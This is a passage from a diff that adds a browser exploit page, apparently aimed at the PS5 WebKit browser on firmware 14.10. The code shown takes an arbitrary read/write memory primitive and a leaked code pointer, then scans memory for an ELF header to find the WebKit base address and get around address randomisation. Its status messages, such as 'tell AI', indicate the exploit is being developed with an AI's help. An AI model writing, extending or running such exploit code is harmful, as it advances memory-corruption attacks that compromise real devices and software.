+  setTimeout(function(){ if(!resolved) S('⏳ still working after 30s (attempt '+attempts+'). Keep refreshing — if it never flips, bug may be patched on 14.10.','#5a3a00'); },30000);
+
+  // ---- ELF-scan from the leaked native-constructor (.text) to the base ----
+  function elfScan(win, ctor){
+    var PAGE=0x4000, MAG=0x464c457f, CAP=0x8000000; // 16KB pages, 128MB cap
+    function r4(a){ win.setAddress(a); var b=win.bytes; return (b[0]|(b[1]<<8)|(b[2]<<16)|(b[3]<<24))>>>0; }
+    function rb(a,n){ win.setAddress(a); var b=win.bytes; var o=new Uint8Array(n); for(var i=0;i<n;i++)o[i]=b[i]; return o; }
+    var a=Math.floor(ctor/PAGE)*PAGE, floor=Math.max(0x100000000, a-CAP);
+    var steps=0, stray=0;
+    for(; a>=floor; a-=PAGE, steps++){
+      if(r4(a)!==MAG) continue;
+      var h=rb(a,0x40);
+      if(h[4]!==2||h[5]!==1){stray++;continue;}             // ELF64 LE
+      if((h[16]|(h[17]<<8))!==3){stray++;continue;}          // ET_DYN
+      var phoff=(h[0x20]|(h[0x21]<<8)|(h[0x22]<<16)|(h[0x23]<<24))>>>0;
+      var phentsize=h[0x36]|(h[0x37]<<8);
+      var phnum=h[0x38]|(h[0x39]<<8);
+      if(!phnum||phnum>0x100||phentsize<0x38){stray++;continue;}
+      var contains=false;
+      for(var i=0;i<phnum;i++){
+        var e=rb(a+phoff+i*phentsize,0x30);
+        if(((e[0]|(e[1]<<8)|(e[2]<<16)|(e[3]<<24))>>>0)!==1) continue; // PT_LOAD
+        var vaddr=((e[0x10]|(e[0x11]<<8)|(e[0x12]<<16)|(e[0x13]<<24))>>>0)+((e[0x14]|(e[0x15]<<8))*0x100000000);
+        var memsz=((e[0x28]|(e[0x29]<<8)|(e[0x2a]<<16)|(e[0x2b]<<24))>>>0)+((e[0x2c]|(e[0x2d]<<8))*0x100000000);
+        var lo=a+vaddr, hi=lo+memsz;
+        if(ctor>=lo&&ctor<hi){contains=true;break;}
+      }
+      if(contains) return {base:a,steps:steps,stray:stray};
+      stray++;
+    }
+    return {base:0,steps:steps,stray:stray};
+  }
+
+  establishPrimitive(evHandler).then(function(win){
+    resolved=true;
+    BK('ARW-READY'); EV('ARW','ARW PRIMITIVE WORKS on 14.10','hit');
+    S('🔑 ARW PRIMITIVE WORKS on 14.10! deriving webkit base…','#0a5a7a');
+    var ctor = globalThis.__ps5NativeCtor||0;
+    if(!(ctor>4294967296)){ BK('NO-CTOR'); S('🔑 ARW works but no code pointer — tell AI','#8a5a00'); return; }
+    BK('CTOR-0x'+ctor.toString(16)); EV('CTOR','code ptr 0x'+ctor.toString(16),'hit');
+    var res;
+    try{ res=elfScan(win,ctor); }
+    catch(e){ BK('SCAN-ERR-'+String(e&&e.message).slice(0,40)); S('🔑 ARW works; scan threw — tell AI','#8a5a00'); return; }
+    try{ win.resetAddress(); }catch(e){}
+    if(res.base){
+      var rva=ctor-res.base;
+      BK('WKBASE-0x'+res.base.toString(16)+'-RVA-0x'+rva.toString(16)+'-steps'+res.steps); EV('WKBASE','WEBKIT BASE 0x'+res.base.toString(16)+' RVA 0x'+rva.toString(16),'hit');
+      S('🎯🎯 WEBKIT BASE 0x'+res.base.toString(16)+'  —  STEP 5 SOLVED! tell AI 🎉','#0a7a2a');
+    }else{
+      BK('WKBASE-NOTFOUND-steps'+res.steps+'-stray'+res.stray); EV('WKBASE','base not found in 128MB ('+res.steps+' pages)','warn');
+      S('🔑 ARW works but base not in 128MB ('+res.steps+' pages) — tell AI','#8a5a00');
+    }
+  }).catch(function(e){
+    resolved=true;
+    BK('PRIM-REJECT-'+String(e&&e.message).slice(0,60));
+    S('❌ primitive rejected: '+String(e&&e.message).slice(0,50),'#5a2a2a');
+  });
+})();
+</script>
+</body></html>
